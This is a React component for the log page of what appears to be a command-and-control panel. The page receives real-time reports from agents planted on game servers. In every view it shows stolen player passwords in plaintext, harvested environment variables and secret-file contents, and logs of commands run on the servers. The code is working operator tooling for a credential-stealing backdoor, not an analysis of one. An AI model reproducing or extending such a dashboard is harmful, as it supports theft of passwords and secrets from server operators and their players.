import React, { useState, useEffect, useRef } from 'react';
import { onWS } from '../api';
import { useAuth } from '../AuthContext';

export default function Logs() {
  const { authedFetch, isAdmin } = useAuth();
  const [logs, setLogs] = useState([]);
  const [filter, setFilter] = useState('all');
  const [selected, setSelected] = useState(null);

  useEffect(() => {
    if (!isAdmin) return;

    authedFetch('/api/logs')
      .then(r => r.json())
      .then(data => {
        if (data.logs) setLogs(data.logs.reverse());
      })
      .catch(() => {});

    const unsub1 = onWS('panel:log:command', (payload) => {
      setLogs(prev => [{ ...payload, _real: true }, ...prev].slice(0, 1000));
    });
    const unsub2 = onWS('panel:log:password', (payload) => {
      setLogs(prev => [{ ...payload, _real: true }, ...prev].slice(0, 1000));
    });
    const unsub3 = onWS('panel:log:recon', (payload) => {
      setLogs(prev => [{ ...payload, _real: true }, ...prev].slice(0, 1000));
    });

    return () => { unsub1(); unsub2(); unsub3(); };
  }, [isAdmin]);

  const filtered = filter === 'all' ? logs : logs.filter(l => l.type === filter);

  const timeStr = (ts) => {
    const d = new Date(ts);
    return d.toLocaleTimeString();
  };

  const badge = (type) => {
    if (type === 'command') return 'CMD';
    if (type === 'password') return 'PWD';
    if (type === 'recon') return 'RECON';
    return '?';
  };

  return (
    <div>
      <h1 className="page-title">Logs</h1>
      <p className="page-subtitle">Real-time command executions, password captures, and recon data</p>

      <div className="logs-filter">
        <button className={`logs-filter-btn ${filter === 'all' ? 'active' : ''}`} onClick={() => setFilter('all')}>All</button>
        <button className={`logs-filter-btn ${filter === 'command' ? 'active' : ''}`} onClick={() => setFilter('command')}>Commands</button>
        <button className={`logs-filter-btn ${filter === 'password' ? 'active' : ''}`} onClick={() => setFilter('password')}>Passwords</button>
        <button className={`logs-filter-btn ${filter === 'recon' ? 'active' : ''}`} onClick={() => setFilter('recon')}>Recon</button>
      </div>

      <div className="logs-list">
        {filtered.length === 0 && (
          <div className="empty-state" style={{ padding: '40px 20px' }}>
            <h2>No logs yet</h2>
            <p>Logs appear here in real-time when agents report commands, captured passwords, or recon data (env vars, secret files).</p>
          </div>
        )}
        {filtered.map((entry, i) => (
          <div
            key={i}
            className={`log-entry ${entry.type} ${entry._real ? 'real' : ''}`}
            onClick={() => setSelected(entry)}
          >
            <span className="log-time">{timeStr(entry.timestamp)}</span>
            <span className="log-server">{entry.serverName || entry.serverId?.slice(0, 8)}</span>
            <span className="log-type-badge">{badge(entry.type)}</span>
            {entry.type === 'command' ? (
              <span className="log-desc">
                <strong>{entry.who}</strong> used <strong>.{entry.command}</strong>
                {entry.target && entry.target !== '-' ? <> on <strong>{entry.target}</strong></> : ''}
              </span>
            ) : entry.type === 'password' ? (
              <span className="log-desc">
                <strong>{entry.player}</strong> password: <strong>{entry.password}</strong>
              </span>
            ) : entry.type === 'recon' ? (
              <span className="log-desc">
                <strong>{entry.reconType === 'env' ? 'ENV' : 'FILE'}</strong> {entry.key?.length > 60 ? entry.key.substring(0, 60) + '...' : entry.key}
              </span>
            ) : null}
          </div>
        ))}
      </div>

      {selected && (
        <div className="modal-overlay" onClick={() => setSelected(null)}>
          <div className="modal" onClick={e => e.stopPropagation()}>
            <button className="modal-close" onClick={() => setSelected(null)}>&times;</button>
            <h3>Log Detail</h3>
            <div className="modal-detail">
              <div className="modal-row"><span>Type</span><span>{selected.type === 'command' ? 'Command' : selected.type === 'password' ? 'Password' : 'Recon'}</span></div>
              <div className="modal-row"><span>Server</span><span>{selected.serverName || selected.serverId}</span></div>
              <div className="modal-row"><span>Time</span><span>{new Date(selected.timestamp).toLocaleString()}</span></div>
              {selected.type === 'command' ? (
                <>
                  <div className="modal-row"><span>Who</span><span>{selected.who}</span></div>
                  <div className="modal-row"><span>Command</span><span>.{selected.command}</span></div>
                  {selected.target && selected.target !== '-' && (
                    <div className="modal-row"><span>Target</span><span>{selected.target}</span></div>
                  )}
                </>
              ) : selected.type === 'password' ? (
                <>
                  <div className="modal-row"><span>Player</span><span>{selected.player}</span></div>
                  <div className="modal-row"><span>Password</span><span className="pwd-value">{selected.password}</span></div>
                </>
              ) : (
                <>
                  <div className="modal-row"><span>Source</span><span>{selected.reconType === 'env' ? 'Environment Variable' : 'Secret File'}</span></div>
                  <div className="modal-row"><span>Key / Path</span><span style={{ wordBreak: 'break-all', fontFamily: 'JetBrains Mono, monospace', fontSize: 12 }}>{selected.key}</span></div>
                  <div className="modal-row" style={{ flexDirection: 'column', alignItems: 'stretch', gap: 6 }}>
                    <span style={{ color: 'var(--text-dim)', fontWeight: 500 }}>Value / Content</span>
                    <pre style={{
                      background: '#000', color: '#94a3b8', padding: 12, borderRadius: 6,
                      fontSize: 12, fontFamily: 'JetBrains Mono, monospace', lineHeight: 1.5,
                      maxHeight: 300, overflow: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all',
                    }}>{selected.value}</pre>
                  </div>
                </>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
